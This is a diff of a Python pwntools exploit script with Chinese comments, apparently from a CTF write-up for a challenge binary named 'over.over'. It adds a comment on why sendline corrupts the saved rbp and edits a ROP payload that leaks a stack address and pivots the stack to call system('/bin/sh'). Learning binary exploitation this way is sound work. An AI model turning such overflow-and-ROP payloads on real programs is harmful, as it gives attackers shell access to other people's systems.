@@ -284,6 +284,8 @@ elf = ELF("./over.over")
 libc = elf.libc # 本地打，可以直接获取libc
 
 io.sendafter(b">", b'a' * 80)
+# 不能使用sendline，因为回车会影响read的读入。如果使用sendline，那么回车"\0a"会被作为数据录入，直接影响到saved rbp
+
 buf = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - 0x70
 # 这个程序本身会调用puts打印出我们输入的东西，而puts只有遇到"\0"才会停
 # 我们用0x80个a把栈空间填满，于是puts就会一直打印直到遇到"\0"
@@ -399,7 +401,7 @@ Gadgets information
 0x0000000000400509 : ret
 '''
 ret = 0x400509 # 栈对齐
-payload=flat([b'/bin/sh\0', pop_rdi_ret, p64(buf-0x30), ret, system, (80 - 8*5)*b"a", buf - 0x30, 0x4006be])
+payload=flat([b'/bin/sh\0', pop_rdi_ret, p64(buf-0x30), ret, system, (80 - 8*5)*b"a", buf - 0x30, leave_ret])
 # 把字符串存栈里调用也可以
 
 io.sendafter(b">", payload)
